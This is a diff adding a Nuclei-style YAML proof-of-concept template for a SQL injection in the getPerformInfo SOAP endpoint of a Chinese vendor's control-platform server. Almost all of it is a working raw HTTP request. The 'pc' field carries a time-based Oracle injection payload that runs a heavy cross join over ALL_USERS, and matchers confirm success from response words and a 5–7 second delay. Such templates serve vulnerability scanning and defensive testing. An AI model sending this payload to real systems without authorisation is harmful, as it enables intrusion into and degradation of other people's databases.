@@ -1,0 +1,39 @@
+id: poc-yaml-sendinfo-control-platform-server-getperforminfo-sqli
+info:
+  name: 深大智能科技有限公司管控平台服务端 getPerformInfo SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+http:
+  - raw:
+      - |
+        POST /API.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+        SOAPAction: "http://tempuri.org/getPerformInfo"
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <getPerformInfo xmlns="http://tempuri.org/">
+              <pc>' OR 4155=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)-- AodC</pc>
+              <isa>string</isa>
+            </getPerformInfo>
+          </soap:Body>
+        </soap:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "\"retdata\":"
+          - "getPerformInfoResponse"
+          - "getPerformInfoResult"
+        part: body
+      - type: word
+        words:
+          - "text/xml"
+        part: header
+      - type: dsl
+        dsl:
+          - duration > 5
+          - duration < 7
